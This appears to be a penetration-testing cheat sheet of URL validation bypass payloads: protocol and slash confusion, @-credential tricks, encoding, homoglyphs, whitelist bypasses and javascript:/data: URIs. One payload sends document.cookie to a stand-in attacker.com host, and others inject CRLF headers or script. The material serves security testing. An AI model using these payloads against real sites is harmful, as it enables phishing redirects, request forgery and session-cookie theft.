# URL Validation Bypass

## Summary
Bypass domain/path validation using protocol confusion, encoding, and obfuscation techniques.

## Protocol Confusion

```bash
# Double protocol — some parsers only validate the first
http://attacker.com#http://target.com
http://attacker.com?http://target.com

# Protocol confusion — treat as path relative to valid host
https://target.com@attacker.com
https://target.com%40attacker.com

# CRLF injection in protocol
http://attacker.com%0d%0aHost:%20target.com
```

## Slash Confusion

```bash
# Leading slashes — interpreted as protocol-relative
//attacker.com
///attacker.com
////attacker.com

# Backslash — some Windows-based parsers accept \ as /
\\attacker.com
https://target.com/\attacker.com

# Slash in authority — some parsers ignore embedded slash
https://target.com/http://attacker.com

# URL-encoded slashes
%2F%2Fattacker.com
%2f%2fattacker.com
```

## @ Character Bypass

```bash
# The @ symbol causes parsers to treat everything before it as credentials
https://target.com@attacker.com
https://target.com:80@attacker.com
https://valid.com#@attacker.com
https://valid.com%00@attacker.com

# With encoded @
https://target.com%40attacker.com
https://target.com%2540attacker.com
```

## Unicode and Homoglyph Attacks

```bash
# Unicode dots in domain — IDN homograph (Punycode bypass)
https://target.com/redirect?url=http://xn--ttacker-2ef.com

# Cyrillic characters that look like ASCII
# Cyrillic homoglyphs can replace Latin characters
https://tаrget.com  # Cyrillic а replaces Latin a

# Fullwidth characters
https://target.com?redirect=http://％６５ｘａｍｐｌｅ．ｃｏｍ

# Newline injection
http://attacker.com%0a
```

## Domain Validation Bypass

```bash
# Subdomain whitelist bypass
https://attacker.com.target.com
https://attacker.com%2etarget.com
https://attacker.com.target.com.evil.com

# Starts-with bypass
https://target.com.attacker.com
https://target.com%40attacker.com
https://target.com.attacker.com/evil

# Contains bypass: substring match may succeed where exact match fails
https://eviltarget.com
https://not-target.com

# TLD confusion — .target.com could be owned by attacker
https://target.com.malicious.com
```

## JavaScript Protocol Handlers

```bash
# javascript: URI scheme bypass
javascript:alert(1)//http://target.com
javascript:fetch(`http://attacker.com/${document.cookie}`)//

# data: URI scheme
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

# vbscript: (IE legacy)
vbscript:msgbox("open")
```

## Port and Fragment Tricks

```bash
# Port number confusion
https://target.com:443@attacker.com
https://target.com:80@attacker.com:443

# Fragment with validation bypass
http://attacker.com/#target.com
http://attacker.com?return=target.com
```

## False Positives (Not Bypasses)

- Redirect to same origin only — not vulnerable
- Hardcoded allowed list with exact match — check for parser differential
- URL decoded twice in chain — double encoding may work

